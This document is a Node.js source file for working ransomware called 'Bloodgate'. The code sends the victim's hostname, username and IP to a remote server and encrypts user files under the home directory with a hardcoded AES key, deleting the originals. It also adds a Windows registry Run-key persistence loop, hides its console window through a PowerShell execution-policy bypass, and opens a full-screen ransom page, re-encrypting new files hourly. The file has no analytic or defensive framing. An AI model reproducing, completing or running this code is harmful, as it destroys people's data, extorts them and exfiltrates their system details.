const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const { exec, spawn } = require('child_process');
const axios = require('axios');
const { networkInterfaces } = require('os');

const SERVER_URL = 'https://bloodgate-production.up.railway.app'; // ← CHANGE THIS

class BloodgateRansomware {
    constructor() {
        this.victimId = crypto.randomBytes(8).toString('hex').toUpperCase();
        this.encryptedCount = 0;
        this.targetExtensions = [
            '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.pdf', '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff',
            '.mp3', '.mp4', '.avi', '.mkv', '.wmv',
            '.zip', '.rar', '.7z', '.tar', '.gz',
            '.db', '.sqlite', '.sql', '.csv',
            '.psd', '.ai', '.eps', '.svg',
            '.cpp', '.c', '.java', '.py', '.js', '.html', '.css', '.php'
        ];
        this.encryptedFiles = [];
    }

    getSystemInfo() {
        const interfaces = networkInterfaces();
        let ip = 'Unknown';
        for (const name of Object.keys(interfaces)) {
            for (const iface of interfaces[name]) {
                if (!iface.internal && iface.family === 'IPv4') {
                    ip = iface.address;
                    break;
                }
            }
        }
        return {
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            username: os.userInfo().username,
            totalMemory: os.totalmem(),
            cpus: os.cpus().length,
            ip: ip,
            osVersion: os.version ? os.version() : os.release()
        };
    }

    async register() {
        try {
            const response = await axios.post(`${SERVER_URL}/api/register-victim`, {
                systemInfo: this.getSystemInfo(),
                filesEncrypted: 0
            });
            if (response.data.success) {
                console.log(`🩸 Registered: ${this.victimId}`);
                return true;
            }
        } catch (error) {
            console.error('Registration failed:', error.message);
        }
        return false;
    }

    findFiles(dir) {
        let results = [];
        try {
            const items = fs.readdirSync(dir);
            for (const item of items) {
                const fullPath = path.join(dir, item);
                try {
                    const stat = fs.statSync(fullPath);
                    if (stat.isDirectory()) {
                        const skip = ['Windows', 'Program Files', 'Program Files (x86)', 
                                     'System32', 'AppData', 'boot', 'System Volume Information'];
                        if (!skip.includes(item)) {
                            results = results.concat(this.findFiles(fullPath));
                        }
                    } else if (stat.isFile()) {
                        const ext = path.extname(item).toLowerCase();
                        if (this.targetExtensions.includes(ext) && stat.size < 10 * 1024 * 1024) {
                            results.push(fullPath);
                        }
                    }
                } catch (e) {}
            }
        } catch (e) {}
        return results;
    }

    async encryptFile(filePath) {
        try {
            const response = await axios.post(`${SERVER_URL}/api/encrypt`, {
                filePath: filePath
            });
            if (response.data.success) {
                this.encryptedCount++;
                this.encryptedFiles.push(filePath);
                return true;
            }
        } catch (error) {
            try {
                const key = crypto.createHash('sha256').update('BLOODGATE_CRYPT_2026').digest();
                const iv = crypto.randomBytes(16);
                const data = fs.readFileSync(filePath);
                const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
                const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
                const result = Buffer.concat([iv, encrypted]);
                const encryptedPath = filePath + '.bloodgate';
                fs.writeFileSync(encryptedPath, result);
                fs.unlinkSync(filePath);
                this.encryptedCount++;
                this.encryptedFiles.push(filePath);
                return true;
            } catch (e) {}
        }
        return false;
    }

    openRedScreen() {
        const bloodgateUrl = `${SERVER_URL}/bloodgate`;
        
        if (process.platform === 'win32') {
            exec(`start msedge --kiosk "${bloodgateUrl}" --new-window --fullscreen --start-maximized`);
            setTimeout(() => {
                exec(`start chrome --kiosk "${bloodgateUrl}" --new-window --start-maximized`);
            }, 2000);
            setTimeout(() => {
                exec(`start "${bloodgateUrl}"`);
            }, 4000);
        } else if (process.platform === 'darwin') {
            exec(`open -a "Google Chrome" --args --kiosk "${bloodgateUrl}"`);
        } else {
            exec(`google-chrome --kiosk "${bloodgateUrl}"`);
        }
    }

    setupPersistence() {
        if (process.platform === 'win32') {
            try {
                const scriptPath = path.join(os.tmpdir(), 'bloodgate.bat');
                const script = `@echo off\nnode "${__filename}"\ntimeout /t 60 /nobreak > nul\ngoto loop\n:loop\nnode "${__filename}"\ntimeout /t 60 /nobreak > nul\ngoto loop`;
                fs.writeFileSync(scriptPath, script);
                exec(`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Bloodgate /t REG_SZ /d "${scriptPath}" /f`);
                console.log('🛡️ Persistence set');
            } catch (e) {}
        }
    }

    hideWindow() {
        if (process.platform === 'win32') {
            try {
                const hideScript = `
                    $hwnd = (Get-Process -Id $pid).MainWindowHandle
                    Add-Type -Name Window -Namespace Console -MemberDefinition '
                        [DllImport("user32.dll")]
                        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
                    '
                    [Console.Window]::ShowWindow($hwnd, 0)
                `;
                const hidePath = path.join(os.tmpdir(), 'hide.ps1');
                fs.writeFileSync(hidePath, hideScript);
                exec(`powershell -ExecutionPolicy Bypass -File "${hidePath}"`);
                setTimeout(() => {
                    try { fs.unlinkSync(hidePath); } catch(e) {}
                }, 2000);
            } catch (e) {}
        }
    }

    async run() {
        console.log('🩸 BLOODGATE ACTIVATED');
        this.hideWindow();
        this.setupPersistence();
        await this.register();
        
        const userDir = os.homedir();
        const files = this.findFiles(userDir);
        console.log(`📁 Found ${files.length} files`);
        
        const toEncrypt = files.slice(0, 1000);
        for (const file of toEncrypt) {
            await this.encryptFile(file);
        }
        console.log(`🔒 Encrypted ${this.encryptedCount} files`);
        
        this.openRedScreen();
        
        setInterval(() => {
            const newFiles = this.findFiles(userDir);
            for (const file of newFiles) {
                if (!this.encryptedFiles.includes(file)) {
                    this.encryptFile(file);
                }
            }
        }, 3600000);
    }
}

const ransomware = new BloodgateRansomware();
ransomware.run().catch(console.error);
